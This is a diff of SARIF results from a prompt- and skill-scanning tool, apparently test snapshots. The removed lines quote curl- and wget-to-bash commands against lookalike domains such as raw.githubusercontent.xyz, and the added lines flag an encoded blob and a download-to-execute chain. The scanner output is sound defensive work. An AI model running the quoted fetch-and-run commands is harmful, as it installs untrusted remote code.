@@ -10,12 +10,12 @@
           "informationUri": "https://github.com/your-org/prompthound/blob/main/README.md",
           "rules": [
             {
-              "id": "PH001/shell-pipe",
-              "name": "ShellPipe",
+              "id": "PH002/encoded-blob",
+              "name": "EncodedBlob",
               "shortDescription": {
-                "text": "Shell pipe-to-interpreter pattern detected (curl|bash, wget|sh, etc.)"
+                "text": "Base64 or hex-encoded blob detected in file content"
               },
-              "helpUri": "https://github.com/your-org/prompthound/blob/main/README.md#ph001-shell-pipe",
+              "helpUri": "https://github.com/your-org/prompthound/blob/main/README.md#ph002-encoded-blob",
               "properties": {
                 "precision": "high"
               }
@@ -66,92 +66,44 @@
       ],
       "results": [
         {
-          "ruleId": "PH001/shell-pipe",
-          "level": "error",
+          "ruleId": "PH002/encoded-blob",
+          "level": "warning",
           "message": {
-            "text": "Shell pipe-to-interpreter detected at line 25: network fetcher piped directly into a shell interpreter ('curl -fsSL https://raw.githubusercontent.xyz/devtools-collective/setup/main/install.sh | bash')"
+            "text": "Base64 blob (704 chars) detected at line 70: 'eJw9UsuSojAU/SAWIoQQFrNoRDAgD9Fp'... [py block]"
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "<TEST_FILE_PATH>"
+                  "uri": "scripts/_env_setup.py"
                 },
                 "region": {
-                  "startLine": 25,
-                  "endLine": 25
+                  "startLine": 7,
+                  "endLine": 7
                 }
               }
             }
           ],
           "properties": {
             "evidenceType": "rule-hit",
-            "internalRuleId": "SHELL_PIPE_001"
-          }
-        },
-        {
-          "ruleId": "PH001/shell-pipe",
-          "level": "error",
-          "message": {
-            "text": "Shell pipe-to-interpreter detected at line 37: network fetcher piped directly into a shell interpreter ('wget -qO- https://nodeinstall.xyz/setup_lts | bash')"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "<TEST_FILE_PATH>"
-                },
-                "region": {
-                  "startLine": 37,
-                  "endLine": 37
-                }
-              }
-            }
-          ],
-          "properties": {
-            "evidenceType": "rule-hit",
-            "internalRuleId": "SHELL_PIPE_001"
-          }
-        },
-        {
-          "ruleId": "PH001/shell-pipe",
-          "level": "error",
-          "message": {
-            "text": "Shell pipe-to-interpreter detected at line 45: network fetcher piped directly into a shell interpreter (\"curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh\")"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "<TEST_FILE_PATH>"
-                },
-                "region": {
-                  "startLine": 45,
-                  "endLine": 45
-                }
-              }
-            }
-          ],
-          "properties": {
-            "evidenceType": "rule-hit",
-            "internalRuleId": "SHELL_PIPE_001"
+            "internalRuleId": "ENCODED_BLOB_001"
           }
         },
         {
           "ruleId": "PH004/suspicious-domain",
           "level": "warning",
           "message": {
-            "text": "Non-standard TLD at line 25: 'raw.githubusercontent.xyz' (TLD: .'xyz'). Uncommon TLDs are associated with newly-registered attacker domains."
+            "text": "Non-standard TLD at line 114: 'localhost' (TLD: .'localhost'). Uncommon TLDs are associated with newly-registered attacker domains."
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "<TEST_FILE_PATH>"
+                  "uri": "scripts/healthcheck.sh"
                 },
                 "region": {
-                  "startLine": 25,
-                  "endLine": 25
+                  "startLine": 4,
+                  "endLine": 4
                 }
               }
             }
@@ -165,17 +117,17 @@
           "ruleId": "PH004/suspicious-domain",
           "level": "warning",
           "message": {
-            "text": "Non-standard TLD at line 37: 'nodeinstall.xyz' (TLD: .'xyz'). Uncommon TLDs are associated with newly-registered attacker domains."
+            "text": "Non-standard TLD at line 136: 'localhost' (TLD: .'localhost'). Uncommon TLDs are associated with newly-registered attacker domains."
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "<TEST_FILE_PATH>"
+                  "uri": "scripts/smoke-test.sh"
                 },
                 "region": {
-                  "startLine": 37,
-                  "endLine": 37
+                  "startLine": 10,
+                  "endLine": 10
                 }
               }
             }
@@ -189,17 +141,17 @@
           "ruleId": "PH004/suspicious-domain",
           "level": "warning",
           "message": {
-            "text": "Non-standard TLD at line 45: 'sh.rustup.rs' (TLD: .'rs'). Uncommon TLDs are associated with newly-registered attacker domains."
+            "text": "Non-standard TLD at line 36: 'localhost' (TLD: .'localhost'). Uncommon TLDs are associated with newly-registered attacker domains."
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "<TEST_FILE_PATH>"
+                  "uri": "SKILL.md"
                 },
                 "region": {
-                  "startLine": 45,
-                  "endLine": 45
+                  "startLine": 36,
+                  "endLine": 36
                 }
               }
             }
@@ -211,9 +163,9 @@
         },
         {
           "ruleId": "PH100/classifier-score",
-          "level": "warning",
+          "level": "error",
           "message": {
-            "text": "Classifier risk score 0.6453 \u2192 label 'suspicious'."
+            "text": "Classifier risk score 1.0000 \u2192 label 'malicious'."
           },
           "locations": [
             {
@@ -229,42 +181,25 @@
           ],
           "properties": {
             "evidenceType": "classifier",
-            "score": 0.645302,
-            "label": "suspicious",
-            "featureImportances": [
-              {
-                "feature": "domain_suspicion_score",
-                "importance": 0.3293
-              },
-              {
-                "feature": "body_entropy",
-                "importance": 0.22
-              },
-              {
-                "feature": "url_count",
-                "importance": 0.1412
-              },
-              {
-                "feature": "capability_mismatch_score",
-                "importance": 0.0743
-              }
-            ]
+            "score": 1.0,
+            "label": "malicious",
+            "featureImportances": []
           }
         },
         {
           "ruleId": "PH200/capability-chain",
           "level": "warning",
           "message": {
-            "text": "Dangerous capability chain detected: download\u2192execute. Steps: download (line 25), execute (line 51)"
+            "text": "Dangerous capability chain detected: download\u2192execute. Steps: download (scripts/bootstrap.sh:9), execute (scripts/start.sh:8)"
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "<TEST_FILE_PATH>"
+                  "uri": "scripts/bootstrap.sh"
                 },
                 "region": {
-                  "startLine": 25
+                  "startLine": 9
                 }
               }
             }
@@ -275,11 +210,13 @@
             "steps": [
               {
                 "capability": "download",
-                "line": 25
+                "line": 9,
+                "file": "scripts/bootstrap.sh"
               },
               {
                 "capability": "execute",
-                "line": 51
+                "line": 8,
+                "file": "scripts/start.sh"
               }
             ]
           }
